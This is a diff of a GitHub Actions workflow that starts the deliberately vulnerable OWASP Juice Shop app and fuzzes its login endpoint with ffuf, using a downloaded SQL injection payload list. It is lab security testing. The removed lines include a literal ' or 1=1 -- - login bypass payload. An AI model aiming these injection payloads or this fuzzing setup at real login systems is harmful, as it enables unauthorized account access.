@@ -8,47 +8,92 @@ on:
   workflow_dispatch:
 
 permissions:
-  contents: write
-  pull-requests: write
-  security-events: write
+  contents: read
   actions: read
 
 jobs:
   ffuf:
     runs-on: ubuntu-latest
-    services:
-        juice:
-          image: bkimminich/juice-shop
-          ports:
-            - 3000:3000
-    steps:
-      - name: Wait for service
-        run: |
-            sleep 10 
-            curl --path-as-is -i -s -k -X $'POST' \
-              -H $'Host: localhost:3000' -H $'Content-Length: 43' -H $'Content-Type: application/json' -H $'Connection: keep-alive' \
-              --data-binary $'{\"email\":\"\' or 1=1 -- -\",\"password\":\"pass\"}' \
-              $'http://localhost:3000/rest/user/login'
 
-      - name: Get payloads
+    services:
+      juice:
+        image: bkimminich/juice-shop
+        ports:
+          - 3000:3000
+
+    steps:
+      - name: Wait for Juice Shop
         run: |
-          wget https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/refs/heads/master/SQL%20Injection/Intruder/SQL-Injection
-      
-      - name: Install fuzzing
+          for i in {1..60}; do
+            code=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:3000 || true)
+            if [ "$code" = "200" ] || [ "$code" = "304" ]; then
+              echo "Juice Shop is up"
+              exit 0
+            fi
+            sleep 2
+          done
+          echo "Juice Shop did not start in time"
+          docker ps -a
+          exit 1
+
+      - name: Install Go
+        uses: actions/setup-go@v5
+        with:
+          go-version: 'stable'
+
+      - name: Download SQLi payloads
+        run: |
+          wget -O sqli.txt "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Intruder/SQL-Injection"
+          grep -vE '^\s*(#|$)' sqli.txt > sqli-clean.txt
+          wc -l sqli-clean.txt
+
+      - name: Install ffuf
         run: |
           go install github.com/ffuf/ffuf/v2@latest
+          $HOME/go/bin/ffuf -V
 
-      - name: Run fuzzing
+      - name: Baseline failed login
         run: |
-          $HOME/go/bin/ffuf || true
+          curl -s -o baseline-response.json -w "%{http_code}" \
+            -X POST "http://localhost:3000/rest/user/login" \
+            -H "Content-Type: application/json" \
+            --data '{"email":"normal@example.com","password":"wrongpass"}' \
+            > baseline-status.txt
 
-      - name: Get Logs from Service
+      - name: Run ffuf against login
         run: |
-          docker logs $(docker ps -q) > juice-logs.log
+          $HOME/go/bin/ffuf \
+            -w sqli-clean.txt:FUZZ \
+            -u http://localhost:3000/rest/user/login \
+            -X POST \
+            -H "Content-Type: application/json" \
+            -d '{"email":"FUZZ","password":"pass"}' \
+            -mc 200 \
+            -fr '"authentication"' \
+            -of json \
+            -o ffuf-results.json || true
 
-      - name: Upload results
+      - name: Show findings summary
+        run: |
+          echo "Baseline status:"
+          cat baseline-status.txt
+          echo
+          echo "Potential hits:"
+          grep -n '"FUZZ"' ffuf-results.json || true
+          grep -n '"url"' ffuf-results.json || true
+          grep -n '"status"' ffuf-results.json || true
+
+      - name: Get Juice Shop logs
+        run: |
+          docker logs $(docker ps -q --filter ancestor=bkimminich/juice-shop) > juice-logs.log || true
+
+      - name: Upload artifacts
         uses: actions/upload-artifact@v4
         with:
           name: security-reports-bundle
           path: |
+            baseline-status.txt
+            baseline-response.json
+            ffuf-results.json
             juice-logs.log
+          if-no-files-found: warn
